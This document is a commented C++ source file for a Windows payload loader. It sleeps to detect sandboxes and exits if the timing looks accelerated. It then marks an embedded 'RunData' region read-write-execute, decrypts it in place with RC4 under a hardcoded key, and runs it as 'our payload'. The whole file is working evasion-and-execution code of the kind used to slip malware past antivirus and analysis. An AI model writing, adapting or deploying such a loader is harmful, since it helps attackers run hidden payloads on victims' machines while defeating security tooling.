#include <stdio.h>  // Include standard input-output library.
#include <Windows.h>  // Include Windows header file.
#include <chrono>  // Include chrono header file for time-related functionality.
#include <thread>  // Include thread header file for managing threads.

#define _CRT_SECURE_NO_DEPRECATE  // Disable deprecation warnings.
#pragma warning (disable : 4996)  // Disable specific warning.

extern "C" void RunData();  // Declare function RunData from external source.

void rc4(unsigned char* data, int len, const char* key) {  // Define RC4 encryption function.
    int keylen = strlen(key);  // Calculate length of encryption key.
    unsigned char s[256];  // Initialize an array s of size 256 for RC4 encryption.

    for (int i = 0; i < 256; i++) {  // Initialize s array.
        s[i] = i;
    }

    unsigned char j = 0;  // Initialize j to 0.
    for (int i = 0; i < 256; i++) {  // Generate pseudo-random permutation of s array.
        j = (j + s[i] + key[i % keylen]) % 256;
        unsigned char tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
    }

    int i = 0;  // Initialize i to 0.
    j = 0;  // Initialize j to 0.

    for (int n = 0; n < len; n++) {  // Encrypt data using RC4.
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        unsigned char tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
        data[n] ^= s[(s[i] + s[j]) % 256];
    }
}

int main(int argc, char** argv) {  // Define main function.
    auto start = std::chrono::system_clock::now();  // Get current time using chrono.
    std::this_thread::sleep_for(std::chrono::seconds(5));  // Sleep for 5 seconds.
    auto end = std::chrono::system_clock::now();  // Get current time using chrono.
    std::chrono::duration<double> elapsed_seconds = end - start;  // Calculate elapsed time.
    if (elapsed_seconds.count() <= 4.4) {  // If elapsed time is less than or equal to 4.4 seconds.
        exit(0);  // Exit program with code 0.
    }

    // Run our payload function
    const char* key = "SOME STRING HERE";  // Declare encryption key.
    int len = 10942172;  // Declare length of data to be encrypted.
    DWORD oldProtect = 0;  // Initialize oldProtect to 0.

    if (!VirtualProtect((LPVOID)&RunData, len, PAGE_EXECUTE_READWRITE, &oldProtect)) {  // Change protection of memory region containing RunData function to read-write-execute.
        printf("Error:  %d", GetLastError());  // Print error message.
    }

    rc4((unsigned char*)&RunData, len, key);  // Encrypt RunData function using RC4.
    VirtualProtect((LPVOID)&RunData, len, oldProtect, &oldProtect);  // Restore original protection of memory region.
    RunData();  // Call RunData function.
}
